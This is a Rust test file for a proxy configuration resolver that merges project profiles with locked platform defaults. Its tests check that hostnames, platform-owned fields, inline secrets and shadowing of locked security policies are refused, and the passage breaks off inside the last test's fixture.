// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 Soap Bucket LLC

//! The composition resolver, end to end and with nothing mocked
//! (WOR-2434, WOR-2435, WOR-2436).
//!
//! Every test here runs with no `git` binary, no network and no
//! filesystem: the resolver takes profile documents as text and the
//! entries that deploy them, and returns the `origins:` map. That is the
//! whole point of building the model as a pure function first. If the
//! model is wrong, it is wrong cheaply here.

use std::collections::BTreeSet;

use sbproxy_config::origin_profile::{
    claimed_hosts, resolve_origins, validate_origin_defaults, validate_origin_sources,
    OriginProfile, OriginResolveError, ProfileBinding, PLATFORM_OWNED_ORIGIN_FIELDS,
};
use sbproxy_config::types::{EnvironmentTier, OriginSourceEntry, OriginSourcesConfig};

// --- fixtures ---------------------------------------------------------

fn entry(yaml: &str) -> OriginSourceEntry {
    serde_yaml::from_str(yaml).expect("entry fixture parses")
}

fn defaults(yaml: &str) -> serde_yaml::Mapping {
    serde_yaml::from_str(yaml).expect("defaults fixture parses")
}

fn no_local_origins() -> BTreeSet<String> {
    BTreeSet::new()
}

/// The entry every test starts from: one repository, one profile origin
/// named `api`, one host.
const CHECKOUT_ENTRY: &str = r#"
name: checkout
repo: https://git.test/acme/checkout
revision: refs/tags/v1.4.2
path: sbproxy/origin.yaml
hosts:
  api: ["checkout.acme.test"]
"#;

/// The profile that entry deploys.
const CHECKOUT_PROFILE: &str = r#"
name: checkout
spec:
  api:
    base:
      action:
        type: proxy
        url: https://checkout.internal
"#;

/// A platform floor with one WAF policy and one modifier, both named.
const FLOOR: &str = r#"
policies:
  - name: waf
    type: waf
    owasp_crs:
      enabled: true
    action_on_match: block
  - name: rate_limit
    type: rate_limiting
    requests_per_minute: 100
request_modifiers:
  - name: platform_headers
    headers:
      set:
        X-Platform: sbproxy
"#;

fn compose(
    profile: &str,
    entry_yaml: &str,
    floor: Option<&str>,
) -> sbproxy_config::OriginResolution {
    let entry = entry(entry_yaml);
    let floor = floor.map(defaults);
    resolve_origins(
        floor.as_ref(),
        &[ProfileBinding {
            entry: &entry,
            document: profile,
        }],
        &no_local_origins(),
    )
    .expect("composition succeeds")
}

fn compose_err(profile: &str, entry_yaml: &str, floor: Option<&str>) -> OriginResolveError {
    let entry = entry(entry_yaml);
    let floor = floor.map(defaults);
    resolve_origins(
        floor.as_ref(),
        &[ProfileBinding {
            entry: &entry,
            document: profile,
        }],
        &no_local_origins(),
    )
    .expect_err("composition must be refused")
}

/// The composed origin, back as YAML, so a test can assert on the shape
/// the aggregator would publish.
fn as_yaml(resolution: &sbproxy_config::OriginResolution, host: &str) -> serde_yaml::Value {
    let origin = resolution
        .origins
        .get(host)
        .unwrap_or_else(|| panic!("`{host}` composed; got {:?}", resolution.origins.keys()));
    serde_yaml::to_value(origin).expect("a composed origin re-serializes")
}

fn list(value: &serde_yaml::Value, key: &str) -> Vec<serde_yaml::Value> {
    value
        .get(key)
        .and_then(serde_yaml::Value::as_sequence)
        .cloned()
        .unwrap_or_default()
}

fn names(value: &serde_yaml::Value, key: &str) -> Vec<String> {
    list(value, key)
        .iter()
        .map(|item| {
            item.get("type")
                .and_then(serde_yaml::Value::as_str)
                .unwrap_or("?")
                .to_string()
        })
        .collect()
}

// --- WOR-2434: the shape ----------------------------------------------

/// A profile has no field that could hold a hostname, so the attack is
/// unrepresentable rather than blocked.
#[test]
fn a_profile_that_names_a_hostname_anywhere_is_a_schema_error() {
    for offending in [
        "name: checkout\nhost: checkout.acme.test\nspec: {}\n",
        "name: checkout\nhosts: [checkout.acme.test]\nspec: {}\n",
        "name: checkout\nhostname: checkout.acme.test\nspec: {}\n",
        "name: checkout\norigins:\n  checkout.acme.test: {}\n",
    ] {
        let error = serde_yaml::from_str::<OriginProfile>(offending)
            .expect_err("a profile naming a hostname must not deserialize");
        assert!(
            error.to_string().contains("unknown field"),
            "expected an unknown-key refusal, got: {error}"
        );
    }
}

/// The whole point of the block, in one test: a project ships an action
/// and some policies, the runtime supplies the host.
#[test]
fn a_hostless_profile_plus_an_entry_produces_an_origin() {
    let resolution = compose(CHECKOUT_PROFILE, CHECKOUT_ENTRY, Some(FLOOR));
    let origin = as_yaml(&resolution, "checkout.acme.test");
    assert_eq!(
        origin.get("action").and_then(|a| a.get("url")),
        Some(&serde_yaml::Value::String(
            "https://checkout.internal".to_string()
        ))
    );
    // The floor came through untouched.
    assert_eq!(names(&origin, "policies"), vec!["waf", "rate_limiting"]);
}

/// One profile, two named origins, each against its own host list.
#[test]
fn a_multi_origin_profile_materializes_each_named_origin_against_its_own_hosts() {
    let profile = r#"
name: checkout
spec:
  api:
    base:
      action:
        type: proxy
        url: https://checkout.internal
  webhooks:
    base:
      action:
        type: proxy
        url: https://hooks.internal
"#;
    let entry_yaml = r#"
name: checkout
repo: https://git.test/acme/checkout
revision: refs/tags/v1.4.2
path: sbproxy/origin.yaml
hosts:
  api: ["checkout.acme.test", "pay.acme.test"]
  webhooks: ["hooks.acme.test"]
"#;
    let resolution = compose(profile, entry_yaml, None);
    assert_eq!(
        resolution.origins.keys().cloned().collect::<Vec<_>>(),
        vec![
            "checkout.acme.test".to_string(),
            "hooks.acme.test".to_string(),
            "pay.acme.test".to_string(),
        ]
    );
    for host in ["checkout.acme.test", "pay.acme.test"] {
        let origin = as_yaml(&resolution, host);
        assert_eq!(
            origin.get("action").and_then(|a| a.get("url")),
            Some(&serde_yaml::Value::String(
                "https://checkout.internal".to_string()
            )),
            "{host}"
        );
    }
    let hooks = as_yaml(&resolution, "hooks.acme.test");
    assert_eq!(
        hooks.get("action").and_then(|a| a.get("url")),
        Some(&serde_yaml::Value::String(
            "https://hooks.internal".to_string()
        ))
    );
}

/// A profile origin nobody bound hosts to is reported rather than
/// refused: one entry may deploy the API half and leave the webhook half
/// to another environment.
#[test]
fn a_profile_origin_no_entry_bound_is_reported_not_refused() {
    let profile = r#"
name: checkout
spec:
  api:
    base:
      action: {type: proxy, url: https://checkout.internal}
  webhooks:
    base:
      action: {type: proxy, url: https://hooks.internal}
"#;
    let resolution = compose(profile, CHECKOUT_ENTRY, None);
    assert_eq!(resolution.origins.len(), 1);
    assert_eq!(
        resolution.unbound_profile_origins,
        vec!["checkout:webhooks"]
    );
}

/// An entry naming a profile origin the profile does not declare names
/// what the profile does declare, rather than composing nothing.
#[test]
fn an_entry_binding_an_undeclared_profile_origin_is_refused() {
    let entry_yaml = r#"
name: checkout
repo: https://git.test/acme/checkout
path: sbproxy/origin.yaml
hosts:
  admin: ["admin.acme.test"]
"#;
    let error = compose_err(CHECKOUT_PROFILE, entry_yaml, None);
    let text = error.to_string();
    assert!(text.contains("admin"), "{text}");
    assert!(text.contains("checkout"), "{text}");
    assert!(text.contains("It declares: api"), "{text}");
}

// --- WOR-2434: the merge table ----------------------------------------

/// Row 1: a name in the defaults and absent from the project survives.
#[test]
fn a_default_the_project_never_mentions_survives_unchanged() {
    let resolution = compose(CHECKOUT_PROFILE, CHECKOUT_ENTRY, Some(FLOOR));
    let origin = as_yaml(&resolution, "checkout.acme.test");
    let policies = list(&origin, "policies");
    assert_eq!(policies.len(), 2);
    assert_eq!(
        policies[0]
            .get("action_on_match")
            .and_then(serde_yaml::Value::as_str),
        Some("block")
    );
}

/// Row 2: a name in both merges field by field, project wins per field.
#[test]
fn a_name_in_both_merges_field_by_field_with_the_project_winning() {
    let profile = r#"
name: checkout
spec:
  api:
    base:
      action: {type: proxy, url: https://checkout.internal}
      policies:
        - name: rate_limit
          requests_per_minute: 5000
"#;
    let resolution = compose(profile, CHECKOUT_ENTRY, Some(FLOOR));
    let origin = as_yaml(&resolution, "checkout.acme.test");
    let policies = list(&origin, "policies");
    assert_eq!(policies.len(), 2, "the project added nothing new");
    let rate_limit = &policies[1];
    assert_eq!(
        rate_limit.get("requests_per_minute"),
        Some(&serde_yaml::Value::Number(5000.into())),
        "the project's field won"
    );
    assert_eq!(
        rate_limit.get("type").and_then(serde_yaml::Value::as_str),
        Some("rate_limiting"),
        "the field the project did not mention survived"
    );
}

/// Row 3: a name only in the project is appended after the defaults, in
/// project order.
#[test]
fn a_project_only_name_is_appended_after_the_defaults_in_project_order() {
    let profile = r#"
name: checkout
spec:
  api:
    base:
      action: {type: proxy, url: https://checkout.internal}
      policies:
        - name: idempotency_guard
          type: request_validator
        - name: quota
          type: concurrent_limit
"#;
    let resolution = compose(profile, CHECKOUT_ENTRY, Some(FLOOR));
    let origin = as_yaml(&resolution, "checkout.acme.test");
    assert_eq!(
        names(&origin, "policies"),
        vec![
            "waf",
            "rate_limiting",
            "request_validator",
            "concurrent_limit"
        ]
    );
}

/// Row 4: a locked default the project touches is a hard refusal naming
/// the policy, the profile and the entry.
#[test]
fn touching_a_locked_default_names_the_policy_the_profile_and_the_entry() {
    let floor = r#"
policies:
  - name: waf
    type: waf
    owasp_crs:
      enabled: true
    action_on_match: block
    locked: true
"#;
    let profile = r#"
name: checkout
spec:
  api:
    base:
      action: {type: proxy, url: https://checkout.internal}
      policies:
        - name: waf
          action_on_match: log
"#;
    let error = compose_err(profile, CHECKOUT_ENTRY, Some(floor));
    let text = error.to_string();
    assert!(text.contains("`waf`"), "names the policy: {text}");
    assert!(
        text.contains("profile `checkout`"),
        "names the profile: {text}"
    );
    assert!(text.contains("entry `checkout`"), "names the entry: {text}");
    assert!(matches!(error, OriginResolveError::LockedDefault { .. }));
}

/// The runtime's own last-word layer passes straight through a lock.
/// `locked:` protects the floor from the project, not from the platform
/// that wrote it.
#[test]
fn the_entry_override_layer_passes_through_a_lock() {
    let floor = r#"
policies:
  - name: waf
    type: waf
    owasp_crs:
      enabled: true
    action_on_match: block
    locked: true
"#;
    let entry_yaml = r#"
name: checkout
repo: https://git.test/acme/checkout
path: sbproxy/origin.yaml
hosts:
  api: ["checkout.acme.test"]
overrides:
  policies:
    - name: waf
      action_on_match: log
"#;
    let resolution = compose(CHECKOUT_PROFILE, entry_yaml, Some(floor));
    let origin = as_yaml(&resolution, "checkout.acme.test");
    assert_eq!(
        list(&origin, "policies")[0]
            .get("action_on_match")
            .and_then(serde_yaml::Value::as_str),
        Some("log")
    );
}

/// Row 5: `disabled: true` on an unlocked default drops it, and the drop
/// is recorded rather than silent.
#[test]
fn disabling_an_unlocked_default_drops_it_and_records_the_drop() {
    let profile = r#"
name: checkout
spec:
  api:
    base:
      action: {type: proxy, url: https://checkout.internal}
      policies:
        - name: rate_limit
          disabled: true
"#;
    let resolution = compose(profile, CHECKOUT_ENTRY, Some(FLOOR));
    let origin = as_yaml(&resolution, "checkout.acme.test");
    assert_eq!(names(&origin, "policies"), vec!["waf"]);
    assert_eq!(resolution.drops.len(), 1);
    assert_eq!(resolution.drops[0].name, "rate_limit");
    assert_eq!(resolution.drops[0].list, "policies");
    assert_eq!(resolution.drops[0].profile, "checkout");
    assert_eq!(resolution.drops[0].entry, "checkout");
}

/// A locked default cannot be disabled either. `disabled:` is an
/// override like any other.
#[test]
fn a_locked_default_cannot_be_disabled() {
    let floor = r#"
policies:
  - name: waf
    type: waf
    owasp_crs:
      enabled: true
    locked: true
"#;
    let profile = r#"
name: checkout
spec:
  api:
    base:
      action: {type: proxy, url: https://checkout.internal}
      policies:
        - name: waf
          disabled: true
"#;
    assert!(matches!(
        compose_err(profile, CHECKOUT_ENTRY, Some(floor)),
        OriginResolveError::LockedDefault { .. }
    ));
}

/// Row 6: an unnamed entry in `origin_defaults` is a config error. A
/// default has to be addressable to be overridable.
#[test]
fn an_unnamed_origin_defaults_entry_is_refused() {
    let floor = defaults(
        r#"
policies:
  - name: waf
    type: waf
  - type: rate_limiting
"#,
    );
    let error = validate_origin_defaults(&floor).expect_err("an unnamed default must be refused");
    assert!(matches!(
        error,
        OriginResolveError::UnnamedDefault {
            list: "policies",
            index: 1,
            ..
        }
    ));
    assert!(
        error.to_string().contains("addressable"),
        "the message says why: {error}"
    );
}

/// Row 7: an unnamed entry in a project profile is always an addition.
#[test]
fn an_unnamed_project_entry_is_always_an_addition() {
    let profile = r#"
name: checkout
spec:
  api:
    base:
      action: {type: proxy, url: https://checkout.internal}
      request_modifiers:
        - headers:
            set:
              X-Service: checkout
"#;
    let resolution = compose(profile, CHECKOUT_ENTRY, Some(FLOOR));
    let origin = as_yaml(&resolution, "checkout.acme.test");
    let modifiers = list(&origin, "request_modifiers");
    assert_eq!(modifiers.len(), 2, "appended, never merged into the floor");
}

/// The scenario the whole floor concept exists to prevent.
#[test]
fn an_empty_policies_list_in_a_project_profile_leaves_the_defaults_intact() {
    let profile = r#"
name: checkout
spec:
  api:
    base:
      action: {type: proxy, url: https://checkout.internal}
      policies: []
"#;
    let resolution = compose(profile, CHECKOUT_ENTRY, Some(FLOOR));
    let origin = as_yaml(&resolution, "checkout.acme.test");
    assert_eq!(
        names(&origin, "policies"),
        vec!["waf", "rate_limiting"],
        "an empty list is not a delete verb"
    );
}

/// Bookkeeping keys never reach the composed origin. The modifier
/// structs are `deny_unknown_fields` and have no `name` field, so a
/// surviving one is a boot failure rather than a cosmetic wart.
#[test]
fn name_locked_and_disabled_are_stripped_before_emit() {
    let floor = r#"
policies:
  - name: waf
    type: waf
    owasp_crs:
      enabled: true
    locked: true
request_modifiers:
  - name: platform_headers
    headers:
      set:
        X-Platform: sbproxy
"#;
    let profile = r#"
name: checkout
spec:
  api:
    base:
      action: {type: proxy, url: https://checkout.internal}
      request_modifiers:
        - name: platform_headers
          headers:
            set:
              X-Service: checkout
"#;
    let resolution = compose(profile, CHECKOUT_ENTRY, Some(floor));
    let origin = as_yaml(&resolution, "checkout.acme.test");
    for key in ["policies", "request_modifiers"] {
        for item in list(&origin, key) {
            for bookkeeping in ["name", "locked", "disabled"] {
                assert!(
                    item.get(bookkeeping).is_none(),
                    "`{bookkeeping}` survived into {key}: {item:?}"
                );
            }
        }
    }
    // And the merge really happened: both headers are set.
    let headers = list(&origin, "request_modifiers")[0]
        .get("headers")
        .and_then(|h| h.get("set"))
        .cloned()
        .expect("headers.set survives");
    assert!(headers.get("X-Platform").is_some(), "{headers:?}");
    assert!(headers.get("X-Service").is_some(), "{headers:?}");
}

/// A sequence that is not one of the four merge keys replaces wholesale,
/// matching the generic merge contract the repo already commits to.
#[test]
fn a_list_that_is_not_a_merge_key_replaces_wholesale() {
    let floor = r#"
stream_safety: ["pii", "toxicity"]
error_pages:
  - status: 404
    content_type: text/plain
    body: platform
"#;
    let profile = r#"
name: checkout
spec:
  api:
    base:
      action: {type: proxy, url: https://checkout.internal}
      error_pages:
        - status: 404
          content_type: text/plain
          body: service
"#;
    let resolution = compose(profile, CHECKOUT_ENTRY, Some(floor));
    let origin = as_yaml(&resolution, "checkout.acme.test");
    let pages = list(&origin, "error_pages");
    assert_eq!(pages.len(), 1);
    assert_eq!(
        pages[0].get("body").and_then(serde_yaml::Value::as_str),
        Some("service")
    );
    // And a platform-owned list the project cannot reach is untouched.
    assert_eq!(
        list(&origin, "stream_safety"),
        vec![
            serde_yaml::Value::String("pii".to_string()),
            serde_yaml::Value::String("toxicity".to_string())
        ]
    );
}

/// Later layers win, and the runtime bookends the stack.
#[test]
fn the_layer_order_is_defaults_then_base_then_environment_then_entry_overrides() {
    let floor = r#"
action:
  type: proxy
  url: https://floor.internal
  timeout_ms: 1000
"#;
    let profile = r#"
name: checkout
spec:
  api:
    base:
      action:
        type: proxy
        url: https://base.internal
    environments:
      prod:
        action:
          url: https://prod.internal
      staging:
        action:
          url: https://staging.internal
"#;
    let entry_yaml = r#"
name: checkout
repo: https://git.test/acme/checkout
path: sbproxy/origin.yaml
environment: prod
hosts:
  api: ["checkout.acme.test"]
overrides:
  action:
    timeout_ms: 250
"#;
    let resolution = compose(profile, entry_yaml, Some(floor));
    let action = as_yaml(&resolution, "checkout.acme.test")
        .get("action")
        .cloned()
        .expect("action composed");
    assert_eq!(
        action.get("url").and_then(serde_yaml::Value::as_str),
        Some("https://prod.internal"),
        "the selected environment layer beat the base layer"
    );
    assert_eq!(
        action.get("timeout_ms"),
        Some(&serde_yaml::Value::Number(250.into())),
        "the entry override had the last word"
    );
}

/// An environment the entry does not name contributes nothing.
#[test]
fn an_unselected_environment_layer_contributes_nothing() {
    let profile = r#"
name: checkout
spec:
  api:
    base:
      action: {type: proxy, url: https://base.internal}
    environments:
      prod:
        action: {url: https://prod.internal}
"#;
    let resolution = compose(profile, CHECKOUT_ENTRY, None);
    assert_eq!(
        as_yaml(&resolution, "checkout.acme.test")
            .get("action")
            .and_then(|a| a.get("url"))
            .and_then(serde_yaml::Value::as_str),
        Some("https://base.internal")
    );
}

// --- WOR-2434: inputs -------------------------------------------------

/// A declared input with neither a bound value nor a default is a
/// resolve error naming both, not a warning and not literal passthrough.
#[test]
fn an_unbound_declared_input_names_the_input_and_the_entry() {
    let profile = r#"
name: checkout
inputs:
  - name: upstream_key
    description: credential for the upstream
spec:
  api:
    base:
      action:
        type: ai_proxy
        providers:
          - name: openai
            api_key: "{{vars.upstream_key}}"
"#;
    let error = compose_err(profile, CHECKOUT_ENTRY, None);
    let text = error.to_string();
    assert!(text.contains("upstream_key"), "names the input: {text}");
    assert!(text.contains("entry `checkout`"), "names the entry: {text}");
    assert!(matches!(error, OriginResolveError::UnboundInput { .. }));
    assert!(
        !text.contains("{{vars.upstream_key}}"),
        "the refusal is not a passthrough: {text}"
    );
}

/// The entry supplies the reference; the project declared only that it
/// needed one.
#[test]
fn the_entry_binds_the_secret_reference_the_profile_declared() {
    let profile = r#"
name: checkout
inputs:
  - name: upstream_key
    description: credential for the upstream
spec:
  api:
    base:
      action:
        type: ai_proxy
        providers:
          - name: openai
            api_key: "{{vars.upstream_key}}"
"#;
    let entry_yaml = r#"
name: checkout
repo: https://git.test/acme/checkout
path: sbproxy/origin.yaml
hosts:
  api: ["checkout.acme.test"]
inputs:
  upstream_key: "secret://prod/checkout-key"
"#;
    let resolution = compose(profile, entry_yaml, None);
    assert_eq!(
        as_yaml(&resolution, "checkout.acme.test")
            .get("action")
            .and_then(|a| a.get("providers"))
            .and_then(|providers| providers.get(0))
            .and_then(|provider| provider.get("api_key"))
            .and_then(serde_yaml::Value::as_str),
        Some("secret://prod/checkout-key")
    );
}

/// A declared default is used when the entry binds nothing.
#[test]
fn a_declared_default_is_used_when_the_entry_binds_nothing() {
    let profile = r#"
name: checkout
inputs:
  - name: region
    default: "us-east-1"
spec:
  api:
    base:
      action:
        type: proxy
        url: "https://checkout.{{vars.region}}.internal"
"#;
    let resolution = compose(profile, CHECKOUT_ENTRY, None);
    let origin = as_yaml(&resolution, "checkout.acme.test");
    assert_eq!(
        origin
            .get("action")
            .and_then(|a| a.get("url"))
            .and_then(serde_yaml::Value::as_str),
        Some("https://checkout.us-east-1.internal")
    );
}

/// An input binds as text, always. Documented rather than surprising: a
/// typed knob belongs in the entry `overrides:` block, which is runtime
/// YAML and is never substituted.
#[test]
fn an_input_binds_as_text_even_when_the_bound_value_is_a_number() {
    let profile = r#"
name: checkout
inputs:
  - name: rpm
    default: 100
spec:
  api:
    base:
      action: {type: proxy, url: https://checkout.internal}
      policies:
        - name: rate_limit
          type: rate_limiting
          requests_per_minute: "{{vars.rpm}}"
"#;
    let resolution = compose(profile, CHECKOUT_ENTRY, None);
    let origin = as_yaml(&resolution, "checkout.acme.test");
    assert_eq!(
        list(&origin, "policies")[0]
            .get("requests_per_minute")
            .and_then(serde_yaml::Value::as_str),
        Some("100"),
        "an input is substituted into a string, so a number arrives as its text"
    );
}

/// An entry binding a name the profile never declared is refused rather
/// than silently doing nothing, and the refusal says what the profile
/// does declare.
#[test]
fn an_entry_binding_an_undeclared_input_is_refused() {
    let profile = r#"
name: checkout
inputs:
  - name: upstream_key
    default: "secret://prod/key"
spec:
  api:
    base:
      action: {type: proxy, url: https://checkout.internal}
"#;
    let entry_yaml = r#"
name: checkout
repo: https://git.test/acme/checkout
path: sbproxy/origin.yaml
hosts:
  api: ["checkout.acme.test"]
inputs:
  upstrem_key: "secret://prod/key"
"#;
    let error = compose_err(profile, entry_yaml, None);
    let text = error.to_string();
    assert!(text.contains("upstrem_key"), "{text}");
    assert!(text.contains("It declares: upstream_key"), "{text}");
}

// --- WOR-2434: collisions ---------------------------------------------

/// Two entries claiming the same map key names both entries and both
/// repositories. Silent last-wins is the failure this exists to prevent.
#[test]
fn two_entries_claiming_one_host_names_both_entries_and_both_repos() {
    let first = entry(
        r#"
name: checkout
repo: https://git.test/acme/checkout
path: sbproxy/origin.yaml
hosts:
  api: ["shared.acme.test"]
"#,
    );
    let second = entry(
        r#"
name: billing
repo: https://git.test/acme/billing
path: sbproxy/origin.yaml
hosts:
  api: ["shared.acme.test"]
"#,
    );
    let error = claimed_hosts(&[first, second], &no_local_origins())
        .expect_err("a contested map key must be refused");
    let text = error.to_string();
    for fragment in [
        "shared.acme.test",
        "checkout",
        "billing",
        "git.test/acme/checkout",
        "git.test/acme/billing",
    ] {
        assert!(text.contains(fragment), "missing `{fragment}`: {text}");
    }
}

/// A host a hand-written `origins:` key already declares is a refusal
/// too, for exactly the same reason.
#[test]
fn an_entry_claiming_a_hand_written_origin_is_refused() {
    let only = entry(CHECKOUT_ENTRY);
    let local: BTreeSet<String> = ["checkout.acme.test".to_string()].into_iter().collect();
    let error = claimed_hosts(&[only], &local).expect_err("a contested map key must be refused");
    assert!(matches!(
        error,
        OriginResolveError::HostAlreadyDeclared { .. }
    ));
    assert!(error.to_string().contains("already declares"), "{error}");
}

/// Wildcard overlap is not a collision. Exact keys beat wildcards and
/// the longest matching suffix wins between wildcards, all of which the
/// compiler already settles, so the only question here is whether two
/// writers claim the same map key.
#[test]
fn a_wildcard_that_overlaps_an_exact_host_is_not_a_collision() {
    let wildcard = entry(
        r#"
name: catchall
repo: https://git.test/acme/catchall
path: sbproxy/origin.yaml
hosts:
  api: ["*.acme.test"]
"#,
    );
    let exact = entry(CHECKOUT_ENTRY);
    let claims = claimed_hosts(&[wildcard, exact], &no_local_origins())
        .expect("overlap is resolved by the compiler, not refused here");
    assert_eq!(claims.len(), 2);
}

/// The collision check answers from the runtime document alone, which is
/// what lets an operator see it before anything is fetched.
#[test]
fn claimed_hosts_needs_no_profile_document() {
    let claims = claimed_hosts(&[entry(CHECKOUT_ENTRY)], &no_local_origins()).expect("claims");
    assert_eq!(claims.len(), 1);
    assert_eq!(claims[0].host, "checkout.acme.test");
    assert_eq!(claims[0].profile_origin, "api");
    assert_eq!(claims[0].entry, "checkout");
    assert_eq!(claims[0].repo, "https://git.test/acme/checkout");
}

/// A repository URL with an embedded credential never reaches a message.
#[test]
fn a_repo_credential_is_stripped_out_of_every_claim_and_refusal() {
    let with_token = entry(
        r#"
name: checkout
repo: https://octocat:ghp_TOKENVALUE@git.test/acme/checkout
path: sbproxy/origin.yaml
hosts:
  api: ["checkout.acme.test"]
"#,
    );
    let claims =
        claimed_hosts(std::slice::from_ref(&with_token), &no_local_origins()).expect("claims");
    assert!(!claims[0].repo.contains("ghp_TOKENVALUE"), "{claims:?}");
    let local: BTreeSet<String> = ["checkout.acme.test".to_string()].into_iter().collect();
    let error = claimed_hosts(&[with_token], &local).expect_err("refused");
    assert!(!error.to_string().contains("ghp_TOKENVALUE"), "{error}");
}

// --- WOR-2435: the write boundary ------------------------------------

/// The five fields a deny list would have missed, each one refused by
/// the parser because there is no field that could hold it.
#[test]
fn every_field_a_deny_list_would_have_missed_is_unrepresentable() {
    for (field, body) in [
        (
            "filters",
            "filters:\n        - type: waf\n          failure_posture: open\n",
        ),
        ("force_ssl", "force_ssl: false\n"),
        ("response_cache", "response_cache:\n        enabled: true\n"),
        ("on_request", "on_request:\n        - type: lua\n"),
        ("on_response", "on_response:\n        - type: lua\n"),
        ("allowed_methods", "allowed_methods: [GET, POST, DELETE]\n"),
    ] {
        let profile = format!(
            "name: checkout\nspec:\n  api:\n    base:\n      action: {{type: proxy}}\n      {body}"
        );
        let error = compose_err(&profile, CHECKOUT_ENTRY, None);
        let text = error.to_string();
        assert!(
            matches!(error, OriginResolveError::ProfileParse { .. }),
            "{field}: expected a parse refusal, got {text}"
        );
        assert!(text.contains(field), "{field}: names the field: {text}");
        assert!(
            text.contains("profile `checkout`"),
            "{field}: names the profile: {text}"
        );
    }
}

/// The four blocks a project must never reach at all.
#[test]
fn a_profile_naming_a_runtime_owned_block_fails_to_deserialize() {
    for key in ["proxy", "source", "origin_sources", "origin_defaults"] {
        let profile = format!("name: checkout\n{key}: {{}}\nspec: {{}}\n");
        let error = serde_yaml::from_str::<OriginProfile>(&profile)
            .unwrap_err()
            .to_string();
        assert!(error.contains("unknown field"), "{key}: {error}");
        assert!(error.contains(key), "{key}: {error}");
    }
}

/// Every platform-owned field is refused, not only the five the ticket
/// called out. The list is the classification and the parser enforces it.
#[test]
fn every_platform_owned_field_is_refused_by_the_profile_parser() {
    for (field, reason) in PLATFORM_OWNED_ORIGIN_FIELDS {
        assert!(!reason.is_empty(), "`{field}` has no written reason");
        let profile = format!(
            "name: checkout\nspec:\n  api:\n    base:\n      action: {{type: proxy}}\n      \
             {field}: null\n"
        );
        let error = compose_err(&profile, CHECKOUT_ENTRY, None);
        assert!(
            error.to_string().contains(field),
            "`{field}` must be refused by name: {error}"
        );
    }
}

/// Secrets stay a runtime concern. A literal is refused, and the
/// refusal does not carry it.
#[test]
fn a_profile_carrying_an_inline_secret_is_refused_without_echoing_it() {
    let profile = r#"
name: checkout
spec:
  api:
    base:
      action:
        type: ai_proxy
        providers:
          - name: openai
            api_key: "sk-live-NOTAREFERENCE"
"#;
    let error = compose_err(profile, CHECKOUT_ENTRY, None);
    let text = error.to_string();
    assert!(matches!(error, OriginResolveError::InlineSecret { .. }));
    assert!(text.contains("api_key"), "names the field: {text}");
    assert!(
        text.contains("profile `checkout`"),
        "names the profile: {text}"
    );
    assert!(
        !text.contains("sk-live-NOTAREFERENCE"),
        "the refusal echoed the literal: {text}"
    );
}

/// An entry that binds a literal into a declared input is refused the
/// same way, because the check runs after substitution.
#[test]
fn an_entry_binding_a_literal_secret_is_refused_too() {
    let profile = r#"
name: checkout
inputs:
  - name: upstream_key
spec:
  api:
    base:
      action:
        type: ai_proxy
        providers:
          - name: openai
            api_key: "{{vars.upstream_key}}"
"#;
    let entry_yaml = r#"
name: checkout
repo: https://git.test/acme/checkout
path: sbproxy/origin.yaml
hosts:
  api: ["checkout.acme.test"]
inputs:
  upstream_key: "sk-live-BOUNDLITERAL"
"#;
    let error = compose_err(profile, entry_yaml, None);
    assert!(matches!(error, OriginResolveError::InlineSecret { .. }));
    assert!(
        !error.to_string().contains("sk-live-BOUNDLITERAL"),
        "{error}"
    );
}

/// A project may not lock a value against the platform that deploys it.
#[test]
fn a_project_setting_locked_is_refused() {
    let profile = r#"
name: checkout
spec:
  api:
    base:
      action: {type: proxy, url: https://checkout.internal}
      policies:
        - name: my_rule
          type: waf
          locked: true
"#;
    let error = compose_err(profile, CHECKOUT_ENTRY, None);
    assert!(matches!(error, OriginResolveError::ProjectLock { .. }));
    assert!(error.to_string().contains("my_rule"), "{error}");
}

/// A lock has to bind what an entry does, not what it is called.
///
/// The failure this closes: the platform locks a security header in the
/// floor, the project appends its own `response_modifiers` entry under a
/// different name writing the same header, the addition lands after the
/// floor because every addition does, and the last writer wins. Nothing
/// was refused, no drop was recorded, and `/admin/origin-composition`
/// still reported the floor entry as locked.
#[test]
fn a_project_addition_that_shadows_a_locked_header_is_refused() {
    let floor = r#"
response_modifiers:
  - name: platform_security
    locked: true
    headers:
      set:
        Content-Security-Policy: "default-src 'self'"
"#;
    let profile = r#"
name: checkout
spec:
  api:
    base:
      action: {type: proxy, url: https://checkout.internal}
      response_modifiers:
        - name: my_headers
          headers:
            set:
              Content-Security-Policy: "default-src *"
"#;
    let error = compose_err(profile, CHECKOUT_ENTRY, Some(floor));
    let text = error.to_string();
    assert!(
        matches!(error, OriginResolveError::LockedEffectShadowed { .. }),
        "expected a shadow refusal, got: {text}"
    );
    assert!(text.contains("platform_security"), "names the lock: {text}");
    assert!(text.contains("my_headers"), "names the addition: {text}");
    assert!(
        text.contains("profile `checkout`"),
        "names the profile: {text}"
    );
    assert!(text.contains("entry `checkout`"), "names the entry: {text}");
    assert!(
        text.contains("headers.set.content-security-policy"),
        "names the shared effect: {text}"
    );
}

/// A header name is case-insensitive, so the comparison is too. A
/// boundary its own header could walk through by changing case would be
/// no boundary.
#[test]
fn a_shadow_is_caught_across_header_case() {
    let floor = r#"
response_modifiers:
  - name: platform_security
    locked: true
    headers:
      set:
        Content-Security-Policy: "default-src 'self'"
"#;
    let profile = r#"
name: checkout
spec:
  api:
    base:
      action: {type: proxy, url: https://checkout.internal}
      response_modifiers:
        - name: my_headers
          headers:
            set:
              content-security-policy: "default-src *"
"#;
    assert!(matches!(
        compose_err(profile, CHECKOUT_ENTRY, Some(floor)),
        OriginResolveError::LockedEffectShadowed { .. }
    ));
}

/// The same rule on the typed lists, where the discriminator is `type:`
/// rather than the leaf path.
#[test]
fn a_project_policy_of_a_locked_type_is_refused() {
    let floor = r#"
policies:
  - name: platform_waf
    type: waf
    owasp_crs:
      enabled: true
    locked: true
"#;
    let profile = r#"
name: checkout
spec:
  api:
    base:
      action: {type: proxy, url: https://checkout.internal}
      policies:
        - name: my_waf
          type: waf
          owasp_crs:
            enabled: false
"#;
    let error = compose_err(profile, CHECKOUT_ENTRY, Some(floor));
    assert!(matches!(
        error,
        OriginResolveError::LockedEffectShadowed { .. }
    ));
    assert!(error.to_string().contains("type=waf"), "{error}");
}

/// The rule is narrow enough to be usable: an addition that touches
/// nothing the lock touches still lands.
#[test]
fn a_project_addition_that_shadows_nothing_locked_still_lands() {
    let floor = r#"
policies:
  - name: platform_waf
    type: waf
    owasp_crs:
      enabled: true
    locked: true
response_modifiers:
  - name: platform_security
    locked: true
    headers:
      set:
